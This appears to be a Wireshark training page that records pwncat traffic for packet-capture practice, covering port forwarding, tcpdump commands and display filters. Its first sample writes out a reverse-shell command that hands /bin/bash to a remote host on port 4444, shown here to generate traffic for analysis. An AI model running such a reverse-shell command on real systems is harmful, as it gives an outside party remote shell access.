# PWNCAT

Use it in wireshark training


## Sample Capture File : 0001 - pwncat reverse-shell traffic captured

One listener, two clients

```shell
pwncat -e '/bin/bash' example.com 4444
```

```bash
pwncat 192.168.68.107 4444
```

### Display filter example

```text
frame.comment contains connecting
```

Capture file : sc-0001-tcp-keepalive-comment-contains.pcapng (file not found)

## Sample Capture File : 0002 - pwncat local-port-forwarding traffic captured

Traffic sent to localhost:4443 is forwarded to ndawn.btegitim.com:80

```bash
pwncat -L 0.0.0.0:4443 ndawn.btegitim.com 80 
```

### Display filter examples

```text
frame.interface_id == lo0
frame.interface_id == en0
```

### Capture filter example

```text
tcp port 4443 or (tcp port 80 and host ndawn.btegitim.com)
```

### tcpdump capture example 0

A request sent to the address <http://127.0.0.1:4443/moodle/> from a browser running on the localhost . Captures files below are related to this generated traffic.Both interfaces are captured into the same pcapng file.

Capture file : [sc-0002-tcp-local-port-forwarding.pcapng](./../Moved/sc-0002-tcp-local-port-forwarding.pcapng)

### tcpdump capture example 1

A request sent to the address <http://127.0.0.1:4443/moodle/> from a browser running on the localhost . Captures files below are related to this generated traffic.

```bash
tcpdump -i 3 "tcp port 4443 or tcp port 80" -w /captures/sc-0002-tcp-local-port-forwarding-tcpdump-lo0.pcapng -G 60 &
```

```bash
tcpdump -i 1 "tcp port 4443 or tcp port 80" -w /captures/sc-0002-tcp-local-port-forwarding-tcpdump-en0.pcapng -G 60 &
```

Capture file : sc-0002-tcp-local-port-forwarding-lo0.pcapng (file not found)
Capture file : sc-0002-tcp-local-port-forwarding-en0.pcapng (file not found)

## tcpdump capture example 2

A request sent from a browser running on the localhost to the container address <http://172.17.0.2:4443/moodle/>. Captures files below are related to this generated traffic. Please note that pwncat command is running on the container.

```bash
tcpdump -i 1 "tcp port 4443 or tcp port 80" -w /captures/sc-0002-tcp-local-port-forwarding-tcpdump-en0-no-loopback.pcapng -G 60 &
```

Capture file : sc-0002-tcp-local-port-forwarding-tcpdump-en0-no-loopback.pcapng (file not found)

### tcpdump capture example 3

A ssh connection request from a ssh-client running on a remote host 172.17.0.1 to the container 172.17.0.2 on port 4443. Captures files below are related to this generated traffic. Please note that pwncat command is running on the container.

```bash
pwncat -L 0.0.0.0:4443 ndawn.btegitim.com 22
```

```bash
tcpdump -i 1 "tcp port 4443 or tcp port 22" -w /captures/sc-0002-tcp-local-port-forwarding-tcpdump-en0-no-loopback-ssh.pcapng
```

Capture file : sc-0002-tcp-local-port-forwarding-tcpdump-en0-no-loopback-ssh.pcapng (file not found)

### Summary

Example 3 is working as expected. But in example 2 after HTTP 303 is received, remote host is directly communicating with ndawn.btegitim.com
